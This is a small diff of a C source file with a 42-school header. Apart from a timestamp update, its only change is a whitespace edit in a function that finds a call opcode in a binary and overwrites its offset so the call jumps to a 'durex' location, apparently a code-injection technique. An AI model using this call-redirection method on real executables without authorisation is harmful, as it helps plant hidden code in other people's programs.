@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
-/*   Updated: 2018/08/05 19:32:47 by root             ###   ########.fr       */
+/*   Updated: 2018/08/05 20:28:25 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -61,7 +61,7 @@ static void	modify_binary(void *data)
 	int			off = 5; // opcode length of "callq [offset]" is "e8 00 00 00 00" = 5
 	while (*ptr++ != 0xe8)  // Call opcode
 		off++;
-	off = durexoff - ( mainoff + off);
+	off = durexoff - ( mainoff + off );
 	memcpy(ptr, &off, 4);
 }
 
